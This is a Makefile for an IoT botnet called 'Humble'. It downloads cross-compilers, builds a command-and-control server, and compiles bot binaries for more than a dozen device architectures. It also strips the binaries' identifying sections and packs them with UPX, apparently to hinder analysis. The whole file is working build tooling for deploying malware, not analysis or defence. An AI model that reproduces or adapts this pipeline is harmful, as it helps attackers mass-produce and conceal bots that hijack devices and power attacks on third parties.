# Humble botnet build
# if error in cnc build | type 'mysql_config --libs' and replace
# dont worry cloudflare is serving cross compilers hehe

BOT := bot
CNC := cnc
OUT := release
BINSNAME := humble
OTHER := other
COMPILE=/root/compile
FLAGS=-DIPV4

all: release

debug: cnc_build debug_build enc

release: cnc_build arm4_build arm5_build arm6_build arm7_build i586_build i686_build m68k_build mips_build mipsel_build powerpc_build sh4_build sparc_build x86_64_build

prepare: pre-build compilers

pre-build:
	@echo '[Humble/build]: Installing needings.'
	@apt update
	@apt upgrade -y
	@apt install default-libmysqlclient-dev tor wget -y
	@echo '[Humble/build]: Done, now configure your Tor.'

compilers:
	@echo '[Humble/build]: Downloading cross-compilers.'
	@wget --inet4-only https://hiroshima.codes/cross-compiler-armv4l.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-armv5l.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-armv6l.tar.bz2
	@wget --inet4-only https://toolchains.bootlin.com/downloads/releases/toolchains/armv7-eabihf/tarballs/armv7-eabihf--uclibc--stable-2020.08-1.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-i586.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-i686.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-m68k.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-mips.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-mipsel.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-powerpc.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-sh4.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-sparc.tar.bz2
	@wget --inet4-only https://hiroshima.codes/cross-compiler-x86_64.tar.bz2
	@echo '[Humble/build] Extracting cross-compilers.'
	@tar -jxf cross-compiler-armv4l.tar.bz2
	@tar -jxf cross-compiler-armv5l.tar.bz2
	@tar -jxf cross-compiler-armv6l.tar.bz2
	@tar -jxf armv7-eabihf--uclibc--stable-2020.08-1.tar.bz2
	@tar -jxf cross-compiler-i586.tar.bz2
	@tar -jxf cross-compiler-i686.tar.bz2
	@tar -jxf cross-compiler-m68k.tar.bz2
	@tar -jxf cross-compiler-mips.tar.bz2
	@tar -jxf cross-compiler-mipsel.tar.bz2
	@tar -jxf cross-compiler-powerpc.tar.bz2
	@tar -jxf cross-compiler-sh4.tar.bz2
	@tar -jxf cross-compiler-sparc.tar.bz2
	@tar -jxf cross-compiler-x86_64.tar.bz2
	@rm *.tar.bz2
	@echo '[Humble/build] Moving cross-compilers.'
	@mv cross-compiler-armv4l arm4
	@mv cross-compiler-armv5l arm5
	@mv cross-compiler-armv6l arm6
	@mv armv7-eabihf--uclibc--stable-2020.08-1 arm7
	@mv cross-compiler-i586 i586
	@mv cross-compiler-i686 i686
	@mv cross-compiler-m68k m68k
	@mv cross-compiler-mips mips
	@mv cross-compiler-mipsel mipsel
	@mv cross-compiler-powerpc powerpc
	@mv cross-compiler-sh4 sh4
	@mv cross-compiler-sparc sparc
	@mv cross-compiler-x86_64 x86_64
	@mkdir $(COMPILE)
	@mv arm4 $(COMPILE)
	@mv arm5 $(COMPILE)
	@mv arm6 $(COMPILE)
	@mv arm7 $(COMPILE)
	@mv i586 $(COMPILE)
	@mv i686 $(COMPILE)
	@mv m68k $(COMPILE)
	@mv mips $(COMPILE)
	@mv mipsel $(COMPILE)
	@mv powerpc $(COMPILE)
	@mv sh4 $(COMPILE)
	@mv sparc $(COMPILE)
	@mv x86_64 $(COMPILE)
	@echo '[Humble/build] Done with cross-compilers.'


upx:
	@echo '[Humble/build]: Downloading upx.'
	@wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-i386_linux.tar.xz
	@unxz upx-3.95-i386_linux.tar.xz
	@tar -xf upx-3.95-i386_linux.tar
	@mv upx*/upx .
	@echo '[Humble/build]: Compressing bins'
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).arm4
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).arm5
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).arm6
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).arm7
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).i586
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).i686
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).mips
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).mipsel
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).powerpc
	@./upx --ultra-brute $(OUT)/bins/$(BINSNAME).x86
	@rm -rf upx*

enc:
	@echo '[Humble/build]: Building encrypt.'
	@gcc $(OTHER)/enc.c -o $(OUT)/other/enc

cnc_build: 
	@echo '[Humble/build]: Building C2.'
	@gcc $(CNC)/*.c -DDEBUG -lpthread -L/usr/lib/x86_64-linux-gnu  -lmariadbclient -lpthread -lz -lm -ldl -o $(OUT)/cnc/cnc


debug_build:
	@echo '[Humble/build]: Building debug bot.'
	@gcc $(BOT)/*.c -DDEBUG -DIPV4 -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).dbg
	@strip $(OUT)/bins/$(BINSNAME).dbg -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr


arm4_build:
	@echo '[Humble/build]: Building arm4.'
	@$(COMPILE)/arm4/bin/armv4l-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).arm4
	@$(COMPILE)/arm4/bin/armv4l-strip $(OUT)/bins/$(BINSNAME).arm4 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

arm5_build:
	@echo '[Humble/build]: Building arm5.'
	@$(COMPILE)/arm5/bin/armv5l-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).arm5
	@$(COMPILE)/arm5/bin/armv5l-strip $(OUT)/bins/$(BINSNAME).arm5 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr


arm6_build:
	@echo '[Humble/build]: Building arm6.'
	@$(COMPILE)/arm6/bin/armv6l-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).arm6
	@$(COMPILE)/arm6/bin/armv6l-strip $(OUT)/bins/$(BINSNAME).arm6 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

arm7_build:
	@echo '[Humble/build]: Building arm7.'
	@$(COMPILE)/arm7/bin/arm-linux-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).arm7
	@$(COMPILE)/arm7/bin/arm-linux-strip $(OUT)/bins/$(BINSNAME).arm7 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

i586_build:
	@echo '[Humble/build]: Building i586.'
	@$(COMPILE)/i586/bin/i586-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).i586
	@$(COMPILE)/i586/bin/i586-strip $(OUT)/bins/$(BINSNAME).i586 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

i686_build:
	@echo '[Humble/build]: Building i686.'
	@$(COMPILE)/i686/bin/i686-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).i686
	@$(COMPILE)/i686/bin/i686-strip $(OUT)/bins/$(BINSNAME).i686 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

m68k_build:
	@echo '[Humble/build]: Building m68k.'
	@$(COMPILE)/m68k/bin/m68k-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).m68k
	@$(COMPILE)/m68k/bin/m68k-strip $(OUT)/bins/$(BINSNAME).m68k -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

mips_build:
	@echo '[Humble/build]: Building mips.'
	@$(COMPILE)/mips/bin/mips-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).mips
	@$(COMPILE)/mips/bin/mips-strip $(OUT)/bins/$(BINSNAME).mips -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

mipsel_build:
	@echo '[Humble/build]: Building mipsel.'
	@$(COMPILE)/mipsel/bin/mipsel-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).mipsel
	@$(COMPILE)/mipsel/bin/mipsel-strip $(OUT)/bins/$(BINSNAME).mipsel -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

powerpc_build:
	@echo '[Humble/build]: Building powerpc.'
	@$(COMPILE)/powerpc/bin/powerpc-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).powerpc
	@$(COMPILE)/powerpc/bin/powerpc-strip $(OUT)/bins/$(BINSNAME).powerpc -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

sh4_build:
	@echo '[Humble/build]: Building sh4.'
	@$(COMPILE)/sh4/bin/sh4-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).sh4
	@$(COMPILE)/sh4/bin/sh4-strip $(OUT)/bins/$(BINSNAME).sh4 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

sparc_build:
	@echo '[Humble/build]: Building sparc.'
	@$(COMPILE)/sparc/bin/sparc-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).sparc
	@$(COMPILE)/sparc/bin/sparc-strip $(OUT)/bins/$(BINSNAME).sparc -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

x86_64_build:
	@echo '[Humble/build]: Building x86_64.'
	@$(COMPILE)/x86_64/bin/x86_64-gcc $(BOT)/*.c $(FLAGS) -w -std=c99 -static -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $(OUT)/bins/$(BINSNAME).x86
	@$(COMPILE)/x86_64/bin/x86_64-strip $(OUT)/bins/$(BINSNAME).x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
